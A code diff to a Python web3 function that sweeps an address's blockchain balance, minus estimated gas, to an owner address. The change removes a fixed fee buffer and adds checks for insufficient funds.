@@ -301,14 +301,20 @@ def transfer_balance(chain, address, owner, key):
         sample_transaction = {
             'from': checksum_address,
             'to': checksum_owner,
+            'value': 1,
             'gasPrice': gas_price,
-            'value': balance_wei // 2,
         }
-
         gas_estimate = chain_info.w3.eth.estimate_gas(sample_transaction)
         gas_cost = gas_price * gas_estimate
-        buffer_wei = 10**15
-        amount_to_transfer = balance_wei - gas_cost - buffer_wei
+
+        if balance_wei <= gas_cost:
+            return "Insufficient balance to cover gas costs."
+
+        amount_to_transfer = balance_wei - gas_cost
+
+        if amount_to_transfer <= 0:
+            return "Insufficient funds to send a valid transaction."
+
         transaction = {
             'from': checksum_address,
             'to': checksum_owner,
@@ -318,12 +324,10 @@ def transfer_balance(chain, address, owner, key):
             'nonce': nonce,
             'chainId': int(chain_info.id)
         }
-
         signed_txn = chain_info.w3.eth.account.sign_transaction(transaction, key)
         tx_hash = chain_info.w3.eth.send_raw_transaction(signed_txn.rawTransaction)
         tx_receipt = chain_info.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
         return tx_hash.hex()
 
     except Exception as e:
-        return f'Error transferring balance: {e}'
-    
+        return f"Error transferring balance: {str(e)}"
